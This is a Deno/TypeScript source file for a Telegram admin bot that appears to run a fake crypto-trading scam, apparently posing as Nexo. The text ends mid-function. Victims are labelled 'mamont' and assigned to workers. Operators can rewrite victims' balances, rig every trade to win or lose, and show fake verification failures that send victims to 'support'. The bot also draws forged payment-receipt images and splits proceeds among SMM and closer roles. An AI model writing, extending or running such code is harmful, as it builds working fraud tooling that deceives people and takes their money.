import { serve } from "https://deno.land/std@0.131.0/http/server.ts";
import { Bot, webhookCallback, InlineKeyboard, Keyboard } from "https://deno.land/x/grammy@v1.8.3/mod.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import * as Canvas from "https://deno.land/x/canvas/mod.ts";
console.log(`Function "telegram-bot-main" up and running!`);
const supabaseUrl = Deno.env.get("URL") || "";
const supabaseKey = Deno.env.get("KEY") || "";
const supabase = createClient(supabaseUrl, supabaseKey);
const bot = new Bot(Deno.env.get("BOT_TOKEN2") || "");
const bot2 = new Bot(Deno.env.get("BOT_TOKEN"));
const svgText = `
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100%" height="100%" fill="none"/>
  <text x="0" y="60" font-size="48" font-weight="700" font-family="Arial" fill="white">₽</text>
</svg>`;
var Messages;
(function(Messages) {
  Messages["Welcome"] = "Welcome!";
  Messages["NoDataFound"] = "No data found";
  Messages["RefURL"] = "https://t.me/nexo_ru_bot?start=";
  Messages["SelectAction"] = "Выберите действие:";
  Messages["TradingEnabled"] = "Trading enabled";
  Messages["TradingDisabled"] = "Trading disabled";
  Messages["Enabled"] = "enabled";
})(Messages || (Messages = {}));
var ButtonLabels;
(function(ButtonLabels) {
  ButtonLabels["Unlink"] = "Отвязать";
  ButtonLabels["AutoRefill"] = "Автопополнение";
  ButtonLabels["CreateChecks"] = "Создание чеков";
  ButtonLabels["Trading"] = "Торговля";
  ButtonLabels["HiddenVerification"] = "Вериф_спрятан";
  ButtonLabels["ShovedVerification"] = "Вериф_показан";
  ButtonLabels["VerificationFailed"] = "Вериф_не_пройден";
  ButtonLabels["VerificationPassed"] = "Вериф_пройден";
  ButtonLabels["WithdrawalAllowed"] = "Вывод_разрешен";
  ButtonLabels["Unbanned"] = "Разбанен";
  ButtonLabels["Deposits"] = "Депозиты";
  ButtonLabels["Withdrawals"] = "Выводы";
  ButtonLabels["Exchanges"] = "Трейды";
  ButtonLabels["Checks"] = "Чеки";
  ButtonLabels["Deals"] = "Сделки";
  ButtonLabels["Balances"] = "Балансы";
  ButtonLabels["Notification"] = "Уведомление";
  ButtonLabels["Off"] = "Off";
  ButtonLabels["Win"] = "Win";
  ButtonLabels["Lose"] = "Lose";
  ButtonLabels["Users"] = "Користувачі";
  ButtonLabels["Link"] = "Посилання";
  ButtonLabels["ON_SPAM"] = "Spam";
  ButtonLabels["ChangeUSDT"] = "Изменить_USDT";
  ButtonLabels["ChangeRUB"] = "Изменить_RUB";
  ButtonLabels["Send_Message"] = "Відправити_повідомлення";
  ButtonLabels["Comment"] = "Коментарий";
  ButtonLabels["RESET"] = "Обновить";
  ButtonLabels["WORKERS"] = "Workers";
  ButtonLabels["SENDTP"] = "Отправить_ТП";
  ButtonLabels["MAKE_CHECK"] = "Создать_чек";
  ButtonLabels["Spotlights"] = "Spotlights";
})(ButtonLabels || (ButtonLabels = {}));
bot.command("start", async (ctx)=>{
  const chat_id = ctx.message.chat.id;
  const { data, error } = await supabase.from('users').select('id').eq('chat_id', chat_id).single();
  if (error && error.code === 'PGRST116') {
    const { error: insertError } = await supabase.from('users').insert({
      chat_id
    });
    if (insertError) {
      console.error(insertError);
    }
  } else if (error) {
    console.error(error);
  }
  const keyboard = new Keyboard().text(ButtonLabels.Users).text(ButtonLabels.Link).row().text(ButtonLabels.Spotlights);
  await ctx.reply(Messages.Welcome, {
    reply_markup: keyboard
  });
});
bot.on("message:text", async (ctx)=>{
  const userInput = ctx.message.text;
  const id = ctx.message.text.split(' ')[0];
  const type = ctx.message.text.split(' ')[1];
  const action = ctx.message.text.split(' ')[2];
  const chat_id = ctx.message.chat.id;
  if (id === 'myName') {
    const worker_comment = ctx.message.text.split(' ').slice(2).join(' ');
    const code = ctx.message.text.split(' ')[1];
    if (code !== '123safdgxzcbvasd123e') {
      ctx.reply('Невірний код. Будь ласка, спробуйте ще раз.');
      return;
    }
    const { error } = await supabase.from('users').update({
      worker_comment
    }).eq('chat_id', chat_id);
    if (!error) {
      ctx.reply(`Успішно оновлено: ${worker_comment}`);
      const keyboard = new InlineKeyboard().text('Видалити', `DeleteComment ${chat_id}`);
      bot.api.sendMessage('7561947088', `Новий коммент ${worker_comment}`, {
        reply_markup: keyboard
      });
      bot.api.sendMessage('7184660397', `Новий коммент ${worker_comment}`, {
        reply_markup: keyboard
      });
      bot.api.sendMessage('6993432791', `Новий коммент ${worker_comment}`, {
        reply_markup: keyboard
      });
    }
    return;
  }

  // Обробка кнопок (працює для всіх користувачів)
  if (userInput === ButtonLabels.Users) {
    if (ctx.message.chat.id === 7184660397 || ctx.message.chat.id === 7561947088 || ctx.message.chat.id === 6993432791) {
      const { data: users, error } = await supabase.from('users').select('*');
      console.log(error);
      console.log('users:', users);
      users.sort((a, b)=>new Date(b.created_at).getTime() - new Date(a.created_at).getTime()).forEach(async (user)=>{
        const userKeyboard = new InlineKeyboard().text('Details', `details ${user.chat_id}`);
        if (!user.created_at) {
          return;
        }
        if (!user.ref_id) {
          return;
        }
        const { data: worker, error: WorkerError } = await supabase.from('users').select('*').eq('chat_id', user.ref_id);
        console.log('worker:', WorkerError);
        console.log('worker:', worker);
        console.log('user:', user.created_at);
        await ctx.reply(`Created at: ${new Date(user.created_at).toLocaleString()} User: @${user?.username} \n name: ${user?.first_name} \n Comment: ${user?.comment} \n Worker: @${worker[0]?.username} ${worker[0]?.worker_comment} \n`, {
          reply_markup: userKeyboard
        });
      });
      return;
    }
    const { data, error } = await supabase.from('users').select('*').eq('ref_id', ctx.message.chat.id);
    if (error) {
      console.error(error);
      return;
    }
    data.sort((a, b)=>new Date(b.created_at).getTime() - new Date(a.created_at).getTime()).forEach((user)=>{
      const userKeyboard = new InlineKeyboard().text('Details', `details ${user.chat_id}`);
      ctx.reply(`Created at: ${new Date(user.created_at).toLocaleString()} User: @${user?.username} \n name: ${user?.first_name} \n Comment: ${user?.comment}`, {
        reply_markup: userKeyboard
      });
    });
    return;
  } else if (userInput === ButtonLabels.Link) {
    const chat_id = ctx.message.chat.id;
    const { data, error } = await supabase.from('users').select('id').eq('chat_id', chat_id).single();
    if (error) {
      console.error(error);
      return;
    }
    if (!data) {
      await ctx.reply(Messages.NoDataFound);
      return;
    }
    const message = `${Messages.RefURL}${chat_id}\n`;
    await ctx.reply(message);
    return;
  } else if (userInput === ButtonLabels.Spotlights) {
    const keyboard = new Keyboard().webApp("🌐 Spotlights", "https://www.spotlights-ru.com/");
    await ctx.reply('Натисніть кнопку нижче, щоб відкрити Spotlights:', {
      reply_markup: keyboard
    });
    return;
  }

  console.log(ctx, 'text');
  const worker_chat_id = ctx.message.chat.id;
  const { data: user } = await supabase.from('users').select('*').eq('chat_id', worker_chat_id).single();
  console.log(user);
  if (!user.worker_comment) {
    ctx.reply('Введіть коментар для себе. Приклад \n myName <><comment>');
    return;
  }
  if (type === 'rub' || type === 'usdt') {
    const id = ctx.message.text.split(' ')[0];
    const currency = ctx.message.text.split(' ')[1];
    if (currency === 'rub') {
      const { error } = await supabase.from('users').update({
        rub_amount: parseFloat(action)
      }).eq('id', id);
      if (!error) {
        ctx.reply('Баланс змінено');
      }
    } else if (currency === 'usdt') {
      const { error } = await supabase.from('users').update({
        usdt_amount: parseFloat(action)
      }).eq('id', id);
      if (!error) {
        ctx.reply('Баланс змінено');
      }
    }
  } else if (type === 'message') {
    const message = ctx.message.text.split(' ').slice(2).join(' ');
    const { data: user } = await supabase.from('users').select('*').eq('id', id).single();
    bot2.api.sendMessage(user.chat_id, message);
  } else if (type === 'comment') {
    const comment = ctx.message.text.split(' ').slice(2).join(' ');
    const { error } = await supabase.from('users').update({
      comment
    }).eq('id', id);
    if (!error) {
      ctx.reply('Коментар додано');
    }
  }
  if (id === 'addWorker') {
    const workerChatId = ctx.message.text.split(' ')[1];
    const mamont = ctx.message.text.split(' ')[2];
    if (!workerChatId || !mamont) {
      ctx.reply('Введіть команду у форматі: addWorker <worker_chat_id> <mamont_chat_id>');
      return;
    }
    ctx.reply(JSON.stringify(workerChatId), 'workerChatId');
    ctx.reply(JSON.stringify(mamont), 'mamont');
    const { error: insertError } = await supabase.from('users').update({
      ref_id: parseInt(workerChatId)
    }).eq('chat_id', parseInt(mamont));
    if (insertError) {
      ctx.reply('Помилка при додаванні користувача');
      console.error(insertError);
      return;
    }
    ctx.reply(`Користувач з ID ${workerChatId} успішно доданий як працівник. до ${mamont}`);
  }
  if (id === 'check') {
    const price = type;
    const timePhone = action;
    const timeReceive = ctx.message.text.split(' ')[3];
    const timetoReceive2 = ctx.message.text.split(' ')[4];
    const SUPABASE_IMAGE_URL = "https://srvocgygtpgzelmmdola.supabase.co/storage/v1/object/public/images//check.jpg";
    const SUPABASE_RUB_URL = "https://srvocgygtpgzelmmdola.supabase.co/storage/v1/object/public/images//rub.png";
    try {
      // 2️⃣ Load and edit image
      const image = await Canvas.loadImage(SUPABASE_IMAGE_URL);
      const canvas = Canvas.createCanvas(image.width(), image.height());
      const ctx2d = canvas.getContext("2d");
      ctx2d.drawImage(image, 0, 0);
      // 2. Завантажуємо
      const svgImage = await Canvas.loadImage(SUPABASE_RUB_URL);
      // Завантажуємо SVG як зображення
      // 3️⃣ Add text
      ctx2d.font = "700 24px Product Sans ";
      ctx2d.fillStyle = "white";
      ctx2d.fillText(`${timePhone}`, 30, 50);
      ctx2d.font = "700 48px Roboto ";
      ctx2d.fillText(`${price.replace(/\B(?=(\d{3})+(?!\d))/g, " ")}`, 180, 480);
      ctx2d.font = "700 24px Product Sans ";
      ctx2d.drawImage(svgImage, 370, 445, 36, 36); // (x, y, width, height)
      // for (let i = 0; i < 100; i++) {
      //   ctx2d.fillText(`${i}`, 20 * i, 150);asdf
      // }
      // for (let i = 0; i < 100; i++) {
      //   ctx2d.fillText(`${i}`, 0, 20 * i);
      // }
      ctx2d.font = "700 24px Roboto Medium  ";
      ctx2d.fillText('Владимир Васильев М.', 160, 540);
      ctx2d.font = "900 26px Inter";
      function generateRandomFourNumbers() {
        return Math.floor(1000 + Math.random() * 9000).toString();
      }
      ctx2d.fillText("••" + generateRandomFourNumbers(), 30, 920);
      ctx2d.fillText("••0851", 30, 1070);
      const date = new Date(); // або new Date("2025-05-20T00:53:00")
      const twoDigits = (n)=>n.toString().padStart(2, "0");
      ctx2d.fillText(`${timeReceive} ${timetoReceive2}`, 30, 1180);
      // 4️⃣ Convert to Uint8Array buffer
      const editedBuffer = canvas.toBuffer(); // -> Uint8Array
      // 5️⃣ Upload to Supabase
      const filename = `edited/${Date.now()}-image.jpg`;
      const { error } = await supabase.storage.from("images").upload(filename, editedBuffer, {
        contentType: "image/jpeg",
        upsert: true
      });
      if (error) {
        await ctx.reply("❌ Failed to upload: " + error.message);
        return;
      }
      // 6️⃣ Get public URL
      const { data: publicUrl } = supabase.storage.from("images").getPublicUrl(filename);
      // 7️⃣ Send image back to user
      await ctx.replyWithPhoto(publicUrl.publicUrl, {
        caption: "✅ Done! Here's your image."
      });
    } catch (e) {
      console.error('Error sending photo:', e);
      ctx.reply('Не вдалося надіслати зображення.');
    }
  }
  if (id === 'workerList') {
    const { data: users, error } = await supabase.from('users').select('*').not('worker_comment', 'is', null);
    if (error) {
      console.error(error);
      return;
    }
    users.sort((a, b)=>new Date(b.created_at).getTime() - new Date(a.created_at).getTime()).forEach((user)=>{
      const userKeyboard = new InlineKeyboard().text('Видалити', `DeleteComment ${user.chat_id}`);
      ctx.reply(`Created at: ${new Date(user.created_at).toLocaleString()} User: @${user?.username} \n name: ${user?.first_name} \n Comment: ${user?.worker_comment}`, {
        reply_markup: userKeyboard
      });
    });
  }   if (id === 'findUser') {
    const username = ctx.message.text.split(' ')[1];
    if (!username) {
      ctx.reply('Введіть команду у форматі: findUser <username>');
      return;
    }
    const { data: users, error } = await supabase.from('users').select('*').or(`username.ilike.%${username.replace('@', '')}%,first_name.ilike.%${username}%`);
    if (error) {
      console.error(error);
      return;
    }
    if (users.length === 0) {
      ctx.reply('Користувача не знайдено');
      return;
    }
    users.sort((a, b)=>new Date(b.created_at).getTime() - new Date(a.created_at).getTime()).forEach((user)=>{
      const userKeyboard = new InlineKeyboard().text('Details', `details ${user.chat_id}`);
      ctx.reply(`Created at: ${new Date(user.created_at).toLocaleString()} User: @${user?.username} \n name: ${user?.first_name} \n Comment: ${user?.comment}`, {
        reply_markup: userKeyboard
      });
    });
  }
  if (id === 'addPayment') {
    const parts = ctx.message.text.split(' ');
    if (parts.length < 5) {
      ctx.reply('Введіть команду у форматі: addPayment <smm> <amount> <closer> <job> [platform] [type]\nПриклад: addPayment smm123 1000 closer456 developer spotlights trading');
      return;
    }
    const smm = parts[1];
    const amount = parts[2];
    const closer = parts[3];
    const job = parts[4];
    const platform = parts[5] || '';
    const money_type = (parts[6] === 'ico' ? 'ico' : 'trading') || 'trading';

    // Валідація amount
    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0) {
      ctx.reply('Сума повинна бути додатнім числом');
      return;
    }

    try {
      // Викликаємо функцію logic для створення payment
      const { data, error: logicError } = await supabase.functions.invoke('logic', {
        body: {
          type: 'payment',
          smm: smm,
          amount: amount,
          closer: closer,
          job: job,
          platform: platform,
          money_type: money_type
        }
      });

      if (logicError) {
        console.error('Error creating payment:', logicError);
        ctx.reply(`Помилка при створенні платежу: ${logicError.message || JSON.stringify(logicError)}`);
        return;
      }

      const smmAmount = (amountNum * 0.3).toFixed(2);
      const closerAmount = (amountNum * 0.3).toFixed(2);

      ctx.reply(`✅ Платеж успішно створено!\n\nСума: ${amount} USDT\nSMM: #${smm}\nЗаработок SMM: ${smmAmount} USDT (30%)\nCloser: #${closer}\nЗаработок Closer: ${closerAmount} USDT (30%)\nТип: ${money_type}\nПлатформа: ${platform || 'Не вказано'}\nПрофесія: ${job}`);
    } catch (error) {
      console.error('Error in addPayment:', error);
      ctx.reply(`Помилка при створенні платежу: ${error.message || JSON.stringify(error)}`);
    }
  }
});
bot.on("callback_query:data", async (ctx)=>{
  const [data, chat_id, amount] = ctx.callbackQuery.data.split(' ');
  console.log(ctx, 'data');
  const worker_chat_id = ctx.callbackQuery.message?.chat.id;
  console.log('worker_chat_id:', worker_chat_id);
  const { data: user, error } = await supabase.from('users').select('*').eq('chat_id', worker_chat_id).single();
  console.log(error);
  console.log(user);
  if (!user.worker_comment) {
    ctx.reply('Введіть коментар для себе. Приклад \n myName <comment>');
    return;
  }
  const updateUserBalance = async (currency, amount, id)=>{
    const column = currency === 'rub' ? 'rub_amount' : 'usdt_amount';
    const { error } = await supabase.from('users').update({
      [column]: parseFloat(amount)
    }).eq('id', id);
    if (!error) {
      ctx.reply('Баланс змінено');
    }
  };
  const createKeyboard = (chat_id, user)=>{
    return new InlineKeyboard().text(ButtonLabels.Unlink, `${ButtonLabels.Unlink} ${chat_id} `).text(ButtonLabels.Comment, `${ButtonLabels.Comment} ${chat_id}`).row().text(`${ButtonLabels.Trading} ${user['is_trading_enable'] ? '🟢' : '🔴'}`, `${ButtonLabels.Trading} ${chat_id}`).row().text(`${ButtonLabels.SENDTP}`, `${ButtonLabels.SENDTP} ${chat_id}`).row().text(!user["verification_on"] ? ButtonLabels.HiddenVerification : ButtonLabels.ShovedVerification, `${!user["verification_on"] ? ButtonLabels.HiddenVerification : ButtonLabels.ShovedVerification} ${chat_id}`).text(user["verification_needed"] ? ButtonLabels.VerificationFailed : ButtonLabels.VerificationPassed, `${user["verification_needed"] ? ButtonLabels.VerificationFailed : ButtonLabels.VerificationPassed} ${chat_id} `).row().text(ButtonLabels.Balances, `${ButtonLabels.Balances} ${chat_id} `).row().text(ButtonLabels.Withdrawals, `${ButtonLabels.Withdrawals} ${chat_id} `).row().text(ButtonLabels.Exchanges, `${ButtonLabels.Exchanges} ${chat_id} `).row().text(`${ButtonLabels.Off} ${user['auto_win'] === null ? '🔵' : ''}`, `${ButtonLabels.Off} ${chat_id}`).text(`${ButtonLabels.Win} ${user['auto_win'] ? '🟢' : ''}`, `${ButtonLabels.Win} ${chat_id}`).text(`${ButtonLabels.Lose} ${user['auto_win'] === false ? '🔴' : ''}`, `${ButtonLabels.Lose} ${chat_id}`).row().text('Відправити повідомлення', `${ButtonLabels.Send_Message} ${chat_id}`).row().text('Користувачі', `${ButtonLabels.WORKERS} ${chat_id}`).row().text(ButtonLabels.MAKE_CHECK, `${ButtonLabels.MAKE_CHECK} ${chat_id} `).row().text(ButtonLabels.RESET, `${ButtonLabels.RESET} ${chat_id} `).row();
  };
  const replyMessage = async (user)=>{
    const { data } = await supabase.from('users').select('*').eq('chat_id', user.ref_id).single();
    return `
      id: ${user.id} \n
      Профіль: ${user.first_name} \n 
      Коммент: ${user?.comment} \n
      Телеграм: @${user.username} \n
      Створений: ${new Date(user.created_at).toLocaleString()} \n 
      Баланси: \n
      Рубли: ${user.rub_amount} \n
      USDT: ${user.usdt_amount} \n 
      Торговля: ${user.is_trading_enable ? 'Увімкнено' : 'Вимкнено'} \n
      Авторезульат ${user.auto_win ? 'Завжди Перемога' : user.auto_win === null ? 'Нейтрально' : 'Завжди програш'} \n
      Верифікація показуваться: ${user.verification_on ? 'Так' : 'Ні'} \n
      Текст верифікації: ${user.verification_needed ? 'Верификация не пройдена' : 'Верификация пройдена'} \n
      worker: ${data.worker_comment}`;
  };
  if (amount) {
    await updateUserBalance(data.split(' ')[1], amount, data.split(' ')[0]);
  }
  if (data === 'details') {
    const { data: user, error } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    if (error) {
      console.error(error);
      return;
    }
    const keyboard = createKeyboard(chat_id, user);
    const message = await replyMessage(user);
    ctx.reply(message, {
      reply_markup: keyboard
    });
  } else if ([
    ButtonLabels.Win,
    ButtonLabels.Lose,
    ButtonLabels.Off
  ].includes(data)) {
    const auto_win = data === ButtonLabels.Win ? true : data === ButtonLabels.Lose ? false : null;
    const { error } = await supabase.from('users').update({
      auto_win
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: user, error: userError } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    if (userError) {
      console.error(userError);
      return;
    }
    const keyboard = createKeyboard(chat_id, user);
    ctx.reply(await replyMessage(user), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.Trading) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { error } = await supabase.from('users').update({
      is_trading_enable: !user.is_trading_enable
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(await replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.ON_SPAM) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { error } = await supabase.from('users').update({
      spam: !user.spam
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(await replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if ([
    ButtonLabels.ShovedVerification,
    ButtonLabels.HiddenVerification
  ].includes(data)) {
    const verification_on = data === ButtonLabels.HiddenVerification;
    const { error } = await supabase.from('users').update({
      verification_on
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(await replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if ([
    ButtonLabels.VerificationFailed,
    ButtonLabels.VerificationPassed
  ].includes(data)) {
    const verification_needed = data === ButtonLabels.VerificationPassed;
    const { error } = await supabase.from('users').update({
      verification_needed
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(await replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.Balances) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Баланси: \n USDT: ${user.usdt_amount} \n RUB: ${user.rub_amount} \n Щоб змінити баланс введіть команду ${user.id} rub/usdt amount \n Приклад: ${user.id} rub 1000`);
  } else if ([
    ButtonLabels.ChangeUSDT,
    ButtonLabels.ChangeRUB
  ].includes(data)) {
    const currency = data === ButtonLabels.ChangeUSDT ? 'USDT' : 'RUB';
    ctx.reply(`Введите новое значение ${currency}:`);
  } else if (data === ButtonLabels.Withdrawals) {
    const { data: withdraws } = await supabase.from('withdraws').select('*').eq('chat_id', chat_id);
    if (!withdraws || withdraws.length === 0) {
      ctx.reply('Виводів немає');
      return;
    }
    withdraws.forEach((withdraw)=>{
      const keyboard = new InlineKeyboard().text('Details', `details ${withdraw.chat_id}`).row().text('Повернути назад', `back ${withdraw.chat_id} ${withdraw.amount} ${withdraw.currency} ${withdraw.id}`);
      ctx.reply(`Вывод: ${withdraw.amount} ${withdraw.currency} \n Номер карты: ${withdraw.card_number} \n Имя: ${withdraw.name} \n`, {
        reply_markup: keyboard
      });
    });
  } else if (data === ButtonLabels.Send_Message) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Щоб надіслати повідомлення введіть команду ${user.id} message <повідомлення> \n Приклад: ${user.id} message Привіт!`);
  } else if (data === ButtonLabels.Unlink) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Щоб Видалити куристувача введіть команду ${user.id} delete \n Приклад: ${user.id} delete`);
  } else if (data === ButtonLabels.Comment) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Щоб додати коментар до користувача введіть команду ${user.id} comment <message> \n Приклад: ${user.id} comment Долбоеб!`);
  } else if (data === ButtonLabels.Withdrawals) {
    const { data: withdraws } = await supabase.from('withdraws').select('*').eq('chat_id', chat_id);
    if (!withdraws || withdraws.length === 0) {
      ctx.reply('Виводів немає');
      return;
    }
    withdraws.forEach((withdraw)=>{
      const keyboard = new InlineKeyboard().text('Details', `details ${withdraw.chat_id}`).row().text('Повернути назад', `back ${withdraw.chat_id} ${withdraw.amount} ${withdraw.currency} ${withdraw.id}`);
      ctx.reply(`Вывод: X ${withdraw.amount} \n Номер карты: ${withdraw.card_number} \n Имя: ${withdraw.name} \n`, {
        reply_markup: keyboard
      });
    });
  } else if (data === ButtonLabels.Exchanges) {
    const { data: trades } = await supabase.from('trades').select('*').eq('chat_id', chat_id);
    if (!trades || trades.length === 0) {
      ctx.reply('Обмінів немає');
      return;
    }
    trades.forEach((trade)=>{
      const Keyboard = new InlineKeyboard().text('Закрити перемога', `closeTrade ${chat_id} ${trade.id} win`).text('Закрити програш', `closeTrade ${chat_id} ${trade.id} lose`).row();
      if (trade.isActive) {
        ctx.reply(`Токен: ${trade.token} \n Сума: ${trade.amount} \n Активний: ${trade.isActive ? 'Так' : 'Ні'} \n Закриття ${trade.isWin ? 'Перемога' : trade.isWin === null ? 'Казино' : 'Програш'}, \n Відкритий на ${trade.duration / 1000} секунд \n`, {
          reply_markup: Keyboard
        });
      }
      ctx.reply(`Токен: ${trade.token} \n Сума: ${trade.amount} \n Активний: ${trade.isActive ? 'Так' : 'Ні'} \n Закриття ${trade.isWin ? 'Перемога' : trade.isWin === null ? 'Казино' : 'Програш'}, \n Відкритий на ${trade.duration / 1000} секунд \n`);
    });
  } else if (data === ButtonLabels.RESET) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, user);
    ctx.reply(await replyMessage(user), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.WORKERS) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { data: users } = await supabase.from('users').select('*').eq('ref_id', user.ref_id);
    console.log('workers users:', users);
    users.forEach((user)=>{
      const userKeyboard = new InlineKeyboard().text('Details', `details ${user.chat_id}`);
      ctx.reply(`id: ${user.id} \n Профіль: ${user.first_name} \n Коммент: ${user?.comment} \n Телеграм: @${user.username} \n Створений: ${new Date(user.created_at).toLocaleString()} \n`, {
        reply_markup: userKeyboard
      });
    });
  } else if (data === 'closeTrade') {
    const chat_id = ctx.callbackQuery.data.split(' ')[1];
    const trade_id = ctx.callbackQuery.data.split(' ')[2];
    const isWin = ctx.callbackQuery.data.split(' ')[3] === 'win' ? true : ctx.callbackQuery.data.split(' ')[3] === 'lose' ? false : null;
    const { data: trade } = await supabase.from('trades').select('*').eq('id', trade_id).single();
    const { error } = await supabase.from('trades').update({
      isActive: false
    }).eq('id', trade_id);
    if (error) {
      console.error(error);
      return;
    }
    const tradeAmount = parseFloat(trade.amount) * 0.75;
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { error: updateError, data: updatedUser } = await supabase.from('users').update({
      usdt_amount: isWin ? parseFloat(user.usdt_amount) + tradeAmount + parseFloat(trade.amount) : parseFloat(user.usdt_amount) - tradeAmount + parseFloat(trade.amount)
    }).eq('chat_id', chat_id).select('*').single();
    const { error: tradeUpdateError } = await supabase.from('trades').update({
      isWin,
      isActive: false
    }).eq('id', trade_id);
    if (tradeUpdateError) {
      console.error(tradeUpdateError);
      return;
    }
    if (updateError) {
      console.error(updateError);
      return;
    }
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply('Успішно закрито');
    ctx.reply(await replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if (data === 'back') {
    const chat_id = ctx.callbackQuery.data.split(' ')[1];
    const amount = ctx.callbackQuery.data.split(' ')[2];
    const currency = ctx.callbackQuery.data.split(' ')[3];
    const invoice_id = ctx.callbackQuery.data.split(' ')[4];
    console.log('chat_id:', chat_id);
    console.log('amount:', amount);
    console.log('currency:', currency);
    console.log('invoice_id:', invoice_id);
    const { data: invoice } = await supabase.from('withdraws').select('*').eq('id', invoice_id).single();
    if (!invoice) {
      ctx.reply('Рахунок не знайдено');
      return;
    }
    if (invoice.isDone) {
      ctx.reply('Кошти вже повернено');
      return;
    }
    const { error: invoiceError } = await supabase.from('withdraws').update({
      isDone: true
    }).eq('id', invoice_id);
    if (invoiceError) {
      ctx.reply(`Помилка при оновленні рахунку ${JSON.stringify(invoiceError)}`);
      return;
    }
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { error, data: updatedUser } = await supabase.from('users').update({
      ['rub_amount']: parseFloat(user['rub_amount']) + parseFloat(amount)
    }).eq('chat_id', chat_id).select('*').single();
    if (error) {
      console.error(error);
      ctx.reply(`Помилка при оновленні балансу ${JSON.stringify(error)}`);
      return;
    }
    ctx.reply(`Баланс оновлено, повідомлення користувачу відправлено`);
    bot2.api.sendMessage(chat_id, `Ваша транзакция была отменена.`);
  } else if (data === ButtonLabels.MAKE_CHECK) {
    ctx.reply('Введіть суму, час телефону, дату отримання, час отримання \n Приклад: check 1000 12:00 2023-10-10 12:00');
  } else if (data === "DeleteComment") {
    const chat_id = ctx.callbackQuery.data.split(' ')[1];
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    if (!user) {
      ctx.reply('Користувач не знайдений');
      return;
    }
    const { error } = await supabase.from('users').update({
      worker_comment: null
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      ctx.reply(`Помилка при видаленні коментаря: ${JSON.stringify(error)}`);
      return;
    }
    ctx.reply('Коментар видалено');
  }
  if (data.split('_')[0] === 'addAmount') {
    const amount = data.split('_')[1];
    const currency = data.split('_')[2];
    const chat_id = data.split('_')[3];
    const invoice_id = data.split('_')[4];
    console.log(chat_id);
    const { data: invoice } = await supabase.from('invoices').select('*').eq('invoice_id', invoice_id).single();
    if (!invoice.isPayed) {
      // Використовуємо атомарну транзакцію
      const { data: atomicResult, error: atomicError } = await supabase.functions.invoke('atomic-transactions', {
        body: {
          operation: 'update_invoice_balance',
          chat_id: chat_id,
          invoice_id: invoice_id,
          amount: amount,
          currency: currency
        }
      });

      if (atomicError || !atomicResult?.success) {
        console.error('Error in atomic transaction:', atomicError || atomicResult?.error);
        ctx.reply('Помилка при обробці транзакції');
        return;
      }

      // Отримуємо оновлені дані користувача
      const { data: updatedUser, error: userError } = await supabase
        .from('users')
        .select('*')
        .eq('chat_id', chat_id)
        .single();

      if (userError || !updatedUser) {
        console.error('Error fetching updated user:', userError);
        ctx.reply('Помилка при отриманні даних користувача');
        return;
      }

      bot2.api.sendMessage(chat_id, `Ваш баланс пополнен на ${amount} ${currency.toUpperCase()}`);
      const keyboard = createKeyboard(chat_id, updatedUser);
      ctx.reply(await replyMessage(updatedUser), {
        reply_markup: keyboard
      });
    } else {
      ctx.reply('Цей рахунок вже оплачений');
    }
  } else if (data === ButtonLabels.SENDTP) {
    bot2.api.sendMessage(chat_id, `Для прохождения процедуры верификации обратитесь в тех поддержку. \n @Nexo_ru_bot_support`);
    ctx.reply('Cообщение отправлено');
  }
});
bot.command('ref', async (ctx)=>{
  const chat_id = ctx.message.chat.id;
  const { data, error } = await supabase.from('users').select('id').eq('chat_id', chat_id).single();
  if (error) {
    console.error(error);
    return;
  }
  if (!data) {
    await ctx.reply(Messages.NoDataFound);
    return;
  }
  const message = `${Messages.RefURL}${chat_id}\n`;
  await ctx.reply(message);
});
async function handleInserts(payload) {
  const { data: user } = await supabase.from('users').select('*').eq('chat_id', payload.new.chat_id).single();
  console.log('New invoice:', payload.new);
  const { data, error } = supabase.from('users').select('*').eq('chat_id', payload.new.ref_id).single();
